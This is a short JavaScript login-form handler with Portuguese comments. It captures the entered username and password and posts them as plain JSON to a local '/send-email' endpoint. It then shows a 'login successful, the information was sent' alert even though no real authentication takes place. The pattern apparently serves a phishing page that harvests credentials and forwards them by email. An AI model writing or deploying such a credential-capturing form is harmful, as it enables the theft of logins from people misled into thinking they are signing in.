document.getElementById('login-form').addEventListener('submit', function(event) {  
    event.preventDefault();  

    const username = document.getElementById('username').value;  
    const password = document.getElementById('password').value;  

    // Enviar dados para o servidor  
    fetch('http://localhost:3000/send-email', {  
        method: 'POST',  
        headers: {  
            'Content-Type': 'application/json',  
        },  
        body: JSON.stringify({ username, password }),  
    })  
    .then(response => {  
        if (response.ok) {  
            alert('Login realizado com sucesso! As informações foram enviadas.');  
            document.getElementById('login-form').reset();  
        } else {  
            alert('Erro ao enviar as informações.');  
        }  
    })  
    .catch(error => {  
        console.error('Erro:', error);  
        alert('Erro ao enviar as informações.');  
    });  

    document.getElementById('login-form').reset();  
});